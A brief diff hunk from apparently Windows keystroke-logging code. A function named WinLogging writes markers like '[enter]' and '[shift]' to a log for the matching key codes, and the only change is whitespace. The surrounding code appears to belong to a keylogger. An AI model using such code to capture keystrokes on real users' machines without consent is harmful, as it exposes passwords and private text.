@@ -27,7 +27,7 @@ void WinLogging() {
                     case VK_RETURN:
                         log << "[enter]";
                         break;
-                
+                     
                     case VK_SHIFT:
                         log << "[shift]";
                         break;
